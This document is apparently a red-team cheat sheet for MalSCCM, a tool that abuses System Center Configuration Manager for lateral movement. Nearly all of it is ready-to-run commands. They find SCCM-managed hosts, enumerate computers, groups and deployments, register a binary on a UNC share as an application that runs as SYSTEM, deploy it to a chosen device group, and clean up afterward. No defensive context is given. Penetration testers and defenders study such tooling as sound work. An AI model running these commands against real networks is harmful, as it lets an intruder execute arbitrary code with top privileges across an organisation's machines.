### Source
```
https://github.com/nettitude/MalSCCM
```

### Check if current host is managed by a System Centre Configuration Manager (SCCM)
```
MalSCCM.exe locate
```

### List possible targets for lateral movement using SCCM
```
MalSCCM.exe inspect /computers
```

### Check whether the Distribution Point is also the Primary Site (central management location)
```
MalSCCM.exe inspect /server:<distributionPointServerFqdn> /groups
```

### List Computers, Groups, PrimaryUser, Forest, Packages, Applications and Deployments
```
MalSCCM.exe inspect /all /server:<primarySiteFqdn>
```

### Upload binary that will be executed as SYSTEM
```
MalSCCM.exe app /create /name:<appName> /uncpath:"\\<rhost>\SCCMContentLib$\<file>.exe"
```

### Check if application exists
```
MalSCCM.exe inspect /applications
```

### Deploy application
```
MalSCCM.exe app /deploy /name:<appName> /groupname:<targetGroup> /assignmentname:<deploymentName>
```

### Check deployment status
```
MalSCCM.exe inspect /deployments
```

### Remove deployments of applications 
```
MalSCCM.exe app /cleanup /name:<appName>
```

